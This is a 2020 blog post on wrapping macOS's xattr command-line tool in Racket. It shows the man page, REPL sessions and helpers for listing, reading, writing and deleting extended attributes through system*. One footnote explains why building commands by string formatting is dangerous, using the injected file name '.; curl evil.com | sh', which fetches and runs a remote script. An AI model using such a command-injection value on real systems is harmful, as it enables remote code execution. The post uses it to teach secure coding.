---
title: Wrapping xattr as a racket module
date: 2020-01-29
programming/topics:
- Filesystems
programming/languages:
- Racket
---
I recently came across a question: how do you read [[wiki:extended file attributes]]() in Racket. Not being actually that familiar with extended file attributes, I searched online. Nothing seems to currently exist (other than <a href="https://docs.racket-lang.org/fuse/index.html#%28def._%28%28lib._fuse%2Fmain..rkt%29._setxattr%29%29">in the FUSE module, but that's specific to FUSE</a>), but there is a system level exectuable that one could wrap to do this. I haven't done <i>much</i>[^much] with Racket's {{< doc racket "system" >}} or {{< doc racket "system*" >}} function before, so let's give it a whirl.

<!--more-->

First (and doing most of the work), let's take a look at the `xattr` function's [[wiki:man page]]():

<pre style="overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;">
NAME
    xattr -- display and manipulate extended attributes

SYNOPSIS
    xattr [-lrsvx] file ...
    xattr -p [-lrsvx] attr_name file ...
    xattr -w [-rsx] attr_name attr_value file ...
    xattr -d [-rsv] attr_name file ...
    xattr -c [-rsv] file ...
    xattr -h | --help

DESCRIPTION
    The xattr command can be used to display, modify or remove the extended attributes of one or more files, including directories and symbolic links.  Extended attributes are arbitrary metadata stored with a file, but separate from the filesystem attributes (such as modification time or file size).  The metadata is often a null-terminated UTF-8 string, but can also be arbitrary binary data.

    One or more files may be specified on the command line.  For the first two forms of the command, when there are more than one file, the file name is displayed along with the actual results. When only one file is specified, the display of the file name is usually suppressed (unless the -v option described below, is also specified).

    In the first form of the command (without any other mode option specified), the names of all extended attributes are listed.  Attribute names can also be displayed using ``ls -l@''.

    In the second form, using the -p option (``print''), the value associated with the given attribute name is displayed.  Attribute values are usually displayed as strings.  However, if nils are detected in the data, the value is displayed in a hexadecimal representation.

    The third form, with the -w option (``write''), causes the given attribute name to be assigned the given value.

    The fourth form, with the -d option (``delete''), causes the given attribute name (and associated value), to be removed.

    In the fifth form, with the -c option (``clear''), causes all attributes (including their associated values), to be removed.
</pre>

So that is the functionality we will want to wrap. For my first attempt, we'll just read the values. 

```racket
> (define (xattr-list file)
    (system* (find-executable-path "xattr") file))

> (xattr-list "xattr.rkt")
com.apple.FinderInfo
com.apple.metadata:_kMDItemUserTags
```

As I did before, I could use `(system (format "xattr ~a" file))` but I've grown a lot as a developer with a focus on security since then. And one thing I've learned that can cause no end of trouble is using string formatting to build system commands. Just don't do it[^example]. In Racket, use {{< doc racket "system*" >}}. It will take each argument as a parameter and you don't have to worry about properly escaping things. 

A good start, but I really want a list. To do that, we'll need to capture the output from `system*` into a string. Luckily, Racket is good at that:

```racket
> (define (xattr-list file)
    (with-output-to-string
      (thunk
       (system* (find-executable-path "xattr") file))))

> (xattr-list "xattr.rkt")
"com.apple.FinderInfo\ncom.apple.metadata:_kMDItemUserTags\n"
```

And then to pull it apart:

```racket
> (define (xattr-list file)
    (string-split
     (with-output-to-string
       (thunk
        (system* (find-executable-path "xattr") file)))
     "\n"))

> (xattr-list "xattr.rkt")
'("com.apple.FinderInfo" "com.apple.metadata:_kMDItemUserTags")
```

Nice. 

That actually deals with the "\n" that's naturally at the end of the output--and that saw an example ago--properly, but we'll have to deal with that ourselves later.

Now, we copy this a number of time over and over for each of the functions, but that seems like a waste. Instead, let's abstract calling `xattr` in general:

```racket
(define xattr
  (let ([exe (find-executable-path "xattr")])
    (λ args
      (string-trim
       (with-output-to-string
         (thunk
          (apply system* (cons exe args))))
       "\n"
       #:left? #f
       #:right? #t
       #:repeat? #f))))
```

Here, I'm using two tricks. The `let` is within the `define`, so it can't be seen outside of the function, but it's also only evaluated once. Then `(λ args ...`, instead of the more common `(λ (args) ...` means that all of the parameters will be put together into a list. 

Then, deep into the function, we add the function executable and {{< doc racket "apply" >}} `system*` to it in order to deal with arbitrarily many arguments, much the same way `system*` itself does. 

Using this, we can directly replicate the `xattr-list` function:

```racket
> (xattr "xattr.rkt")
"com.apple.FinderInfo\ncom.apple.metadata:_kMDItemUserTags"

> (string-split (xattr "xattr.rkt"))
'("com.apple.FinderInfo" "com.apple.metadata:_kMDItemUserTags")
```

And that's all we'd need. But if we want to make it a bit easier/cleaner, we can wrap the various xattr functions ourselves:

```racket
(define (xattr-list file) (string-split (xattr file) "\n"))
(define (xattr-read file key) (xattr "-p" key file))
(define (xattr-write file key value) (xattr "-w" key value file))
(define (xattr-delete file key) (xattr "-d" key file))
(define (xattr-clear file) (xattr "-c" file))
```

And one more helper just in case we want to read all the keys and values into a nice {{< doc racket "hash" >}}:

```racket
(define (xattr-read-all file)
  (for/hash ([key (in-list (xattr-list file))])
    (values key (xattr-read file key))))
```

Then we can test it:

```racket
> (xattr-list "xattr.rkt")
'("com.apple.FinderInfo" "com.apple.metadata:_kMDItemUserTags")

> (xattr-write "xattr.rkt" "hello" "world")
""

> (xattr-read "xattr.rkt" "hello")
"world"

> (xattr-read-all "xattr.rkt")
'#hash(("com.apple.FinderInfo" . "...")
       ("com.apple.metadata:_kMDItemUserTags" . "...")
       ("hello" . "world"))
```

Nice.

If you want the full source, you can find it on GitHub: [xattr.rkt](https://github.com/jpverkamp/small-projects/blob/master/racket-libraries/xattr.rkt)

[^much]: Although I did in [Graph Coloring]({{< ref "2014-01-15-graph-coloring.md" >}}) and [Phone Networks]({{< ref "2014-05-21-phone-networks.md" >}}) to access GraphViz and [iOS Backup Apps]({{< ref "2015-01-29-ios-backup-apps.md" >}}) to handle parsing binary plists with `plutil`, it's been a while.

[^example]: What if the `file` was `.; curl evil.com | sh`? The command to run would end up `xattr .; curl evil.com | sh` which, as you might imagine, could do all sorts of fun things to your system.